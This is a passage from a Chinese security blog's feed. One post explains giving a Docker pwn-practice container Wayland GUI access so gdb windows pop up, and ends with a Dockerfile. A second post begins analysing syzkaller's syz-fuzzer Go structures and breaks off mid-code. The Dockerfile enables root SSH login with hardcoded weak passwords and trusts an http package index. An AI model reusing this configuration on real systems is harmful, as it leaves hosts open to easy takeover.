tmux 窗口，打破了不同窗口的隔离性：</p><p><img src="https://s2.loli.net/2024/02/23/YJ6XD1qxU8jaVw2.png" alt="更重要的一点是笔者当时非常 sb 认为 tmux 不能翻页，后面才知道 ctrl+b 后按下 [ 就能通过 PgUp 和 PgDn 翻页]"></p><p>笔者当年的解决方案是直接开多个虚拟机，但用起来总感觉差点意思不说，还占用了大量的物理磁盘空间——笔者本科阶段前两年所用的电脑是<strong>机身只搭载了一块 512GB SSD 的 surface book 2</strong>——为什么这里要特别讲一下这个机型并不是因为笔者想要炫富，虽然说从价格而言 surface 系统产品和 MacBook 系列产品一样同属价格极高性价比极低的“高端产品”，但笔者当时是在某海鲜市场买的可能大于二手的机子，所以其实没有花太多钱，但和 MacBook 一样的是 surface 全系列产品<strong>没有办法自行更换包括内存与硬盘在内的任何部件</strong>，而即便是在海鲜市场寻宝的情况下笔者也买不起更大容量的版本，再加上笔者当时除了是个计算机科学爱好者以及网络空间安全专业本科生的身份以外还是半个画师加十六分之一个平面设计师（当然现在已经不是本科生了），装个 visual studio 加个 matlab 加上 jetbrains 全家桶再装个 adobe 半家桶（主要就用 PS 和 AI 还有个剪视频的叫啥👴已经记不得了）就已经把硬盘填得满满当当的了，各种杂七杂八的资料照片音乐视频啥的又要吃掉少说几十 GB，这个时候再塞几个平均十几 GB 的各种虚拟机（主力虚拟机所占用的硬盘空间超过100GB）无疑更是让本就不富裕的 <strong>512GB SSD</strong> 雪上加霜</p><blockquote><p>而笔者为什么选择买这样一台中看不中用的电脑是因为在初中的时候笔者看一本不知道叫啥的电子硬件相关的杂志中看到 <code>surface book</code> 的 <em>屏幕键盘可分离、独显放置在键盘中</em> 的这样一个前所未有的解决方案感到十分惊人加非常的帅气，于是就一直心心念念想要买一台这样的本子，高中时期笔者换过三台不同的平板电脑二合一产品（当然，都是从某海鲜市场淘来的，且基本上是卖了上一台才买下一台），其中第一台是 surface 3 而第三台是 surface pro 3，当时的主要用途是拿来日常刷刷 OI 、写点小说 <del>（那么这里就不得不简单帮忙推广一下某不知名墨姓作家所写的<a href="https://www.qidian.com/book/1027074530/">《从零开始的 CTFer 生活》</a> 这部小说了虽然一直在咕咕咕）</del> 玩一些轻量游戏，体感其实还行</p><blockquote><p>当然现在微软的 surface 系列产品已经能够初步地自行更换硬盘，虽然是充满槽点的 <code>2230</code> 规格，但是和隔壁某水果品牌相比已经好得不得了了</p><blockquote><p>但是各项性能又被隔壁秒成渣渣了，微软你在干什么啊微软（恼）</p><p><del>但其实仔细一想这不应该是Intel的锅么，wintel联盟依托答辩了👊</del></p></blockquote></blockquote><p>以及 surface 系统产品一直有一个噱头就是有个触控笔可以画画，也就是自带数位屏，这也是这个产品一直以来最吸引笔者的一点，虽然微软最初给大家呈上来的只是一坨闻着香吃着臭的答辩，但笔者一直希望随着产品不断迭代，微软能够把这个功能给真正做好，就算达不到 wacom 上万块钱的数位屏相的高度至少也要和国产的一千出头的数位屏掰个手腕的程度，可惜<strong>哪怕是一直到今天最新的 surface pro 9 这一代产品，其绘画手感依旧比不过几千块钱的 iPad ，甚至比不过200块出头的国产数位板</strong>（当然笔者只买了 surface pro 8 没有买 surface pro 9 因为微软非常 SB 地把 3.5mm 耳机接口这个天顶星科技给砍掉了并且性能和续航和 8 代相比并没有什么提升简而言之又是挤牙膏的一代，但笔者有去微软线下门店亲自尝试过最新一代，绘画手感依旧一坨答辩）</p></blockquote><p>虽然 surface book 2 无法更换硬盘的特性让笔者非常痛苦，但仔细想来还是老罗的那句名言——<code>又不是不能用</code>，硬盘空间想办法腾一腾多开好几个虚拟机其实没什么不好，毕竟省去了折腾 docker 的麻烦就一万个值，于是笔者日渐习惯每天在不同虚拟机之间跳来跳去</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231125222853.png" alt="你知道我要说什么.png"></p><p>不过这个问题并没有折磨笔者太长的时间，在玩了将近一个学期的用户态 Pwn 学了各种不同的 house 之后笔者感觉 glibc pwn 在技术上基本上已经玩不出什么新的有意思的花样了，于是选择了 all in Linux kernel pwn，只需要用 QEMU 去跑虚拟机，gdb 可以直接连上 QEMU 的端口进行调试，也不依赖于某些特定的 glibc 环境（虽然后面玩虚拟机逃逸又用到了不过这是后话了），于是当初搭建的几个用户态 Pwn 环境的虚拟机就慢慢用不到了， <em>现在已经被笔者逐一打包扔到备份硬盘当中</em></p><p>而在 2023 年的今天，笔者又想趁着闲暇时间再业余小玩一下用户态的 Pwn（比赛大概率不一定会专门打了，最多就看到 corCTF 这样的优质比赛会去做做他们的内核题，一些比较有意思的的用户态 Pwn 题最多可能赛后会复现之类的），那么环境以及各种 libc（包括 glibc 、tclibc、musl，<del>👴其实没想明白 musl 为啥会在 CTF 里流行起来，是没活了🐎</del>）又重新变为笔者需要面对的问题之一，而彼时同时跑好几个虚拟机的解决方案未免太过于小丑🤡，因此笔者决定找到一个能够在 docker 当中执行 <code>gdb.attach()</code> 时直接在宿主机中弹出一个窗口的办法</p><blockquote><p>写了这么多没用的批话，突然感觉这一篇其实应该放到 <a href="https://arttnba3.cn/categories/PIECES/">PIECES</a> 分类 而非 <a href="https://arttnba3.cn/categories/OPS/">OPS</a> ，但仔细想想其实笔者真正要讲的核心内容其实是 docker 的一个小知识，所以还是放 OPS 分类下或许会更加合适一些</p></blockquote><h1 id="0x01-为-Docker-接入-Wayland-环境"><a href="#0x01-为-Docker-接入-Wayland-环境" class="headerlink" title="0x01. 为 Docker 接入 Wayland 环境"></a>0x01. 为 Docker 接入 Wayland 环境</h1><blockquote><p>笔者所用的图形服务为 Wayland，因此本篇不会讲 X11 该怎么配置（毕竟已经有很多讲这个的<a href="https://gist.github.com/turekt/71f6950bc9f048daaeb69479845b672b">文章</a>了，<del>，以及都什么年代了还在用传统图形服务</del>）</p></blockquote><p>配置的办法其实很简单，我们只需要在启动容器时额外添加一些参数即可，下面是一个简单的例子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t pwnenv_ubuntu20 .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d -p <span class="hljs-string">&quot;2222:22&quot;</span> \</span><br><span class="language-bash">--name=pwnenv_ubuntu20 \</span><br><span class="language-bash">-e XDG_RUNTIME_DIR=/tmp \</span><br><span class="language-bash">-e DISPLAY=<span class="hljs-variable">$DISPLAY</span> \</span><br><span class="language-bash">-e WAYLAND_DISPLAY=<span class="hljs-variable">$WAYLAND_DISPLAY</span> \</span><br><span class="language-bash">-v <span class="hljs-variable">$XDG_RUNTIME_DIR</span>/<span class="hljs-variable">$WAYLAND_DISPLAY</span>:/tmp/<span class="hljs-variable">$WAYLAND_DISPLAY</span> \</span><br><span class="language-bash">-e QT_QPA_PLATFORM=wayland \</span><br><span class="language-bash">pwnenv_ubuntu20</span><br></code></pre></td></tr></table></figure><blockquote><p><del>别问👴这些参数是什么意思，自己查嗷</del></p></blockquote><p>启动之后容器其实就完成对 Wayland 服务的接入了，这里我们简单写一个 QT 小程序看看实力：</p><p><img src="https://s2.loli.net/2023/10/25/bsER7NLVfD3Oq28.png" alt="libEGL 的报错懒得管了，反正日常使用没啥影响"></p><p>现在我们的 docker 就已经成功接入 Host 侧的图形服务了：）</p><h1 id="0x02-让-gdb-attach-弹出一个新的图形窗口"><a href="#0x02-让-gdb-attach-弹出一个新的图形窗口" class="headerlink" title="0x02. 让 gdb.attach() 弹出一个新的图形窗口"></a>0x02. 让 gdb.attach() 弹出一个新的图形窗口</h1><p>这个其实也很简单，笔者用的是 KDE 桌面，所以先在容器里装一个 <code>konsole</code> ，如果你用的是 Gnome 则可以装个 <code>gnome-terminal</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install konsole</span><br></code></pre></td></tr></table></figure><p>之后在 pwntools 调用 gdb 之前将全局变量 <code>context.terminal</code> 的值设为如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">context.terminal = [<span class="hljs-string">&#x27;konsole&#x27;</span>, <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>]<br></code></pre></td></tr></table></figure><p>之后就能像调试本地原生进程那样在调试 docker 里的进程的时候弹出一个新的 gdb 图形窗口了 ：）</p><p><img src="https://s2.loli.net/2023/10/25/fKS5bQUizjakCAr.jpg" alt="yattaze"></p><h1 id="0xFF-What’s-more…"><a href="#0xFF-What’s-more…" class="headerlink" title="0xFF. What’s more…"></a>0xFF. What’s more…</h1><p>最后给出一个笔者自用的开箱即用的 docker pwn 环境的 Dockerfile，有需要的可以自取：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">20.04</span><br><br><span class="hljs-keyword">ARG</span> DEBIAN_FRONTEND=noninteractive<br><br><span class="hljs-comment"># pre-install softwares</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get -y update &amp;&amp; \</span><br><span class="language-bash">    apt-get install -y lib32z1 apt-transport-https python3 python3-pip git \</span><br><span class="language-bash">    libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev \</span><br><span class="language-bash">    vim nano netcat openssh-server unzip make wget bison flex build-essential \</span><br><span class="language-bash">    curl qemu qemu-system-x86 gcc gdb clang lldb tmux konsole</span><br><br><span class="hljs-comment"># enable ssh login</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -f /etc/service/sshd/down</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -ri <span class="hljs-string">&#x27;s/^#?PermitRootLogin\s+.*/PermitRootLogin yes/&#x27;</span> /etc/ssh/sshd_config &amp;&amp;\</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&#x27;s/#UseDNS\ no/UseDNS\ no/g&#x27;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&quot;s/StrictModes yes/StrictModes no/g&quot;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&quot;s/UsePAM yes/UsePAM no/g&quot;</span> /etc/ssh/sshd_config</span><br><br><span class="hljs-comment"># enable login with password</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;PasswordAuthentication yes&#x27;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><br><span class="hljs-comment"># set username and password</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> groupadd arttnba3 &amp;&amp; \</span><br><span class="language-bash">    useradd -g arttnba3 arttnba3 -m -s /bin/bash &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;arttnba3:123456&quot;</span> | chpasswd &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;root:root123456&quot;</span> | chpasswd</span><br><br><span class="hljs-comment"># enable ssh key login</span><br><span class="hljs-comment">#RUN mkdir /home/arttnba3/.ssh &amp;&amp; \</span><br><span class="hljs-comment">#    echo &quot;Your ssh key&quot; &gt; /home/arttnba3/.ssh/authorized_keys</span><br><br><span class="hljs-comment"># keep container running</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh\nservice ssh restart\nsleep infinity&quot;</span> &gt; /root/start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /root/start.sh</span><br><br><span class="hljs-comment"># enable sudo</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y sudo &amp;&amp; \</span><br><span class="language-bash">       usermod -aG sudo arttnba3</span><br><br><span class="hljs-comment"># pwn-related tools</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> python3 -m pip config <span class="hljs-built_in">set</span> global.index-url http://pypi.tuna.tsinghua.edu.cn/simple &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip config <span class="hljs-built_in">set</span> global.trusted-host pypi.tuna.tsinghua.edu.cn &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip install -U pip &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip install --no-cache-dir \</span><br><span class="language-bash">    pwntools \</span><br><span class="language-bash">    ropgadget \</span><br><span class="language-bash">    z3-solver \</span><br><span class="language-bash">    smmap2 \</span><br><span class="language-bash">    apscheduler \</span><br><span class="language-bash">    ropper \</span><br><span class="language-bash">    unicorn \</span><br><span class="language-bash">    keystone-engine \</span><br><span class="language-bash">    capstone \</span><br><span class="language-bash">    angr \</span><br><span class="language-bash">    pebble \</span><br><span class="language-bash">    r2pipe</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cd</span> pwndbg &amp;&amp; <span class="hljs-built_in">chmod</span> +x setup.sh &amp;&amp; ./setup.sh</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/root/start.sh&quot;</span>]</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">22</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;这一日，Docker 再入桌面 GUI 境界&lt;/p&gt;</summary>
    
    
    
    <category term="OPS" scheme="https://arttnba3.github.io/categories/OPS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="运维" scheme="https://arttnba3.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
    <category term="Docker" scheme="https://arttnba3.github.io/tags/Docker/"/>
    
    <category term="GUI" scheme="https://arttnba3.github.io/tags/GUI/"/>
    
    <category term="Wayland" scheme="https://arttnba3.github.io/tags/Wayland/"/>
    
  </entry>
  
  <entry>
    <title>【FUZZ.0x03】syzkaller - III：syz-fuzzer 源码分析</title>
    <link href="https://arttnba3.github.io/2023/09/27/FUZZ-0X03-SYZKALLER-III_SOURCE_SYZFUZZER/"/>
    <id>https://arttnba3.github.io/2023/09/27/FUZZ-0X03-SYZKALLER-III_SOURCE_SYZFUZZER/</id>
    <published>2023-09-26T15:26:14.000Z</published>
    <updated>2023-12-30T20:05:18.821Z</updated>
    
    <content type="html"><![CDATA[<p>（摘下眼镜）Furry？（戴上眼镜）Fuzzer！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>在<a href="https://arttnba3.cn/2023/03/02/FUZZ-0X02-SYZKALLER-II_SOURCE_SYZMANAGER/">上一篇文章</a>当中我们分析了 syzkaller 三大组件当中的 syz-manager 的源码，本篇文章我们继续来分析 syz-fuzzer 的源码</p><p>与 syz-manager 所不同的是，syz-fuzzer 位于 Guest VM 当中，<strong>本质上涵盖了一个传统 fuzzer 的所有基本功能</strong>：输入生成与变异、启动新进程（syz-executor）执行输入、获取覆盖率信息…</p><p>在 syz-fuzzer 运行过程中其会通过 RPC 调用 syz-manager 中的部分函数，因此本篇也会分析上篇所未涉及到的 syz-manager 中的一些函数：）</p><blockquote><p>这一系列文章确实鸽了挺久了，但最近确实是比较忙没啥时间写博客（这一篇其实之前大致的初稿就写好了，但是后面又鸽掉了…），不知道下一篇会是什么时候了 XD</p></blockquote><h1 id="0x01-基本结构体"><a href="#0x01-基本结构体" class="headerlink" title="0x01. 基本结构体"></a>0x01. 基本结构体</h1><p>相比于直接开始一头雾水地分析源码，笔者认为还是有必要在此之前先列出一些基本的结构体，你也可以把这一节当成一个表来查 ：）</p><h2 id="Fuzzing-过程相关"><a href="#Fuzzing-过程相关" class="headerlink" title="Fuzzing 过程相关"></a>Fuzzing 过程相关</h2><h3 id="1-Syscall：单个系统调用的基本信息"><a href="#1-Syscall：单个系统调用的基本信息" class="headerlink" title="1. Syscall：单个系统调用的基本信息"></a>1. Syscall：单个系统调用的基本信息</h3><p>syzkaller <strong>以系统调用为基本输入单位</strong>，定义于 <code>prog/types.go</code> 中的 <code>Syscall</code> 结构体被用来表示单个系统调用的基本信息：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Syscall <span class="hljs-keyword">struct</span> &#123;<br>ID          <span class="hljs-type">int</span><br>NR          <span class="hljs-type">uint64</span> <span class="hljs-comment">// kernel syscall number</span><br>Name        <span class="hljs-type">string</span><br>CallName    <span class="hljs-type">string</span><br>MissingArgs <span class="hljs-type">int</span> <span class="hljs-comment">// number of trailing args that should be zero-filled</span><br>Args        []Field<br>Ret         Type<br>Attrs       SyscallAttrs<br><br>inputResources  []*ResourceDesc<br>outputResources []*ResourceDesc<br>&#125;<br></code></pre></td></tr></table></figure><p>当我们编写 syzlang 文件时，我们可以为系统调用<a href="https://arttnba3.cn/2021/11/24/FUZZ-0X01-SYZKALLER-I/#call-attributes">添加一些属性</a>，这被封装于内嵌在 <code>Syscall</code> 里的 <code>SyscallAttrs</code> 结构体中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// SyscallAttrs 表示 syzlang 的调用属性.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 该结构为系统所有其他部分的 source of truth.</span><br><span class="hljs-comment">// pkg/compiler 使用该结构对描述进行语法分析.</span><br><span class="hljs-comment">// syz-sysgen 使用该结构为 executor 生成代码.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 目前仅支持 `bool`s 与 `uint64`s.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 对于独立属性的描述，参见 docs/syscall_descriptions_syntax.md </span><br><span class="hljs-keyword">type</span> SyscallAttrs <span class="hljs-keyword">struct</span> &#123;<br>Disabled      <span class="hljs-type">bool</span><br>Timeout       <span class="hljs-type">uint64</span><br>ProgTimeout   <span class="hljs-type">uint64</span><br>IgnoreReturn  <span class="hljs-type">bool</span><br>BreaksReturns <span class="hljs-type">bool</span><br>NoGenerate    <span class="hljs-type">bool</span><br>NoMinimize    <span class="hljs-type">bool</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-ChoiceTable：系统调用生成优先级表"><a href="#2-ChoiceTable：系统调用生成优先级表" class="headerlink" title="2. ChoiceTable：系统调用生成优先级表"></a>2. ChoiceTable：系统调用生成优先级表</h3><p>定义于 <code>prog/prio.go</code> 中的 <code>ChoiceTable</code> 是 syz-fuzzer 中非常核心的一个结构，其用于表示<strong>对于给定的系统调用 x，在添加入系统调用 y 后，代码覆盖率会上升的可能性</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// ChooseTable（译注：原文如此）允许对给定的一个系统调用，</span><br><span class="hljs-comment">// 对一个系统调用进行一次权重选择，这基于调用到调用的优先级与开启&amp;可生成的系统调用集合</span><br><span class="hljs-keyword">type</span> ChoiceTable <span class="hljs-keyword">struct</span> &#123;<br>target          *Target<span class="hljs-comment">/* 目标架构信息 */</span><br>runs            [][]<span class="hljs-type">int32</span> <span class="hljs-comment">/* 优先级表 */</span><br>calls           []*Syscall <span class="hljs-comment">/* 系统调用信息 */</span><br>noGenerateCalls <span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">bool</span>  <span class="hljs-comment">/* 不用于输入生成的系统调用号 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>优先级权重值存放在二维数组 <code>run</code> 中，需要注意的是这个优先级为<strong>累加值</strong>，例如有给定的三个系统调用 A、B、C，有这样的一个生成优先级表 <code>prios</code>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">A</span> B C<br><span class="hljs-attribute">A</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">B</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">C</span> <span class="hljs-number">3</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>那么在 <code>run</code> 表中则会将一列的结果逐个加起来，从而有这样的一个结果：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">A</span> B C<br><span class="hljs-attribute">A</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-attribute">B</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span><br><span class="hljs-attribute">C</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><p>为什么要这么做笔者也不知道 ：(</p><h3 id="3-weights：权重"><a href="#3-weights：权重" class="headerlink" title="3. weights：权重"></a>3. weights：权重</h3><p>定义于 <code>prog/prio.go</code> 中的 <code>weights</code> 结构体用于表示【目标系统调用的权重】：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> weights <span class="hljs-keyword">struct</span> &#123;<br>call  <span class="hljs-type">int</span> <span class="hljs-comment">/* 系统调用号 */</span><br>in    <span class="hljs-type">int32</span>  <span class="hljs-comment">/* 以该系统调用作为输入的权重值？ */</span><br>inout <span class="hljs-type">int32</span>  <span class="hljs-comment">/* 以该系统调用作为输出的权重值？ */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-Call：用作输入的单个系统调用"><a href="#4-Call：用作输入的单个系统调用" class="headerlink" title="4. Call：用作输入的单个系统调用"></a>4. Call：用作输入的单个系统调用</h3><p>syzkaller 的 fuzzing 以 syscall 为单位，<code>Syscall</code> 结构体用于表示单个系统调用的基本信息，<code>Call</code> 结构体则表示<strong>带有参数的一个系统调用</strong>，是 syzkaller 中所谓的最小输入单位</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Call <span class="hljs-keyword">struct</span> &#123;<br>Meta    *Syscall<br>Args    []Arg<br>Ret     *ResultArg<br>Props   CallProps<br>Comment <span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-ArgCtx：带上下文的参数"><a href="#5-ArgCtx：带上下文的参数" class="headerlink" title="5. ArgCtx：带上下文的参数"></a>5. ArgCtx：带上下文的参数</h3><p>系统调用的参数用 <code>Arg</code> 接口表示， <code>ArgCtx</code> 为实现了该接口的带有上下文的一个参数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> ArgCtx <span class="hljs-keyword">struct</span> &#123;<br>Parent *[]Arg      <span class="hljs-comment">// GroupArg.Inner (for structs) or Call.Args containing this arg.</span><br>Fields []Field     <span class="hljs-comment">// Fields of the parent struct/syscall.</span><br>Base   *PointerArg <span class="hljs-comment">// Pointer to the base of the heap object containing this arg.</span><br>Offset <span class="hljs-type">uint64</span>      <span class="hljs-comment">// Offset of this arg from the base.</span><br>Stop   <span class="hljs-type">bool</span>        <span class="hljs-comment">// If set by the callback, subargs of this arg are not visited.</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="6-Prog：单个输入程序"><a href="#6-Prog：单个输入程序" class="headerlink" title="6. Prog：单个输入程序"></a>6. Prog：单个输入程序</h3><p>通常情况下我们并不仅以一个系统调用作为输入，而是以<strong>一组系统调用序列</strong>作为输入单位——即一个<strong>程序</strong>，这也是 syzkaller 中<strong>实质上的最小输入单位</strong>，在 syz-fuzzer 当中使用 <code>Prog</code> 结构体来表示<strong>单个输入</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Prog <span class="hljs-keyword">struct</span> &#123;<br>Target   *Target <span class="hljs-comment">/* 目标架构信息 */</span><br>Calls    []*Call <span class="hljs-comment">/* 系统调用序列 */</span><br>Comments []<span class="hljs-type">string</span>  <span class="hljs-comment">/* 注释？ */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="6-Candidate：序列化的单个输入项"><a href="#6-Candidate：序列化的单个输入项" class="headerlink" title="6. Candidate：序列化的单个输入项"></a>6. Candidate：序列化的单个输入项</h3><p>我们通常会有多个 syz-fuzzer 进程与 VM，而我们更希望<strong>在 fuzzer 之间共享那些有用的输入</strong>，这通常通过 <code>syz-fuzzer</code> 向 <code>syz-manager</code> 发起 RPC <code>poll()</code> 来完成——<code>candidate</code> 用以表示<strong>序列化后的输入</strong>，从而方便在不同 进程间传递：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Candidate <span class="hljs-keyword">struct</span> &#123;<br>Prog      []<span class="hljs-type">byte</span><span class="hljs-comment">/* 序列化后的程序 */</span><br>Minimized <span class="hljs-type">bool</span><span class="hljs-comment">/* 是否最小化？ */</span><br>Smashed   <span class="hljs-type">bool</span><span class="hljs-comment">/* 是否要打碎重组？ */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="7-CallInfo：单个系统调用的运行结果"><a href="#7-CallInfo：单个系统调用的运行结果" class="headerlink" title="7. CallInfo：单个系统调用的运行结果"></a>7. CallInfo：单个系统调用的运行结果</h3><p>执行完程序之后我们自然想要知道程序的执行结果，在 syz-fuzzer 当中使用 <code>CallInfo</code> 结构体表示<strong>单个系统调用的执行结果</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> CallInfo <span class="hljs-keyword">struct</span> &#123;<br>Flags  CallFlags<br>Signal []<span class="hljs-type">uint32</span> <span 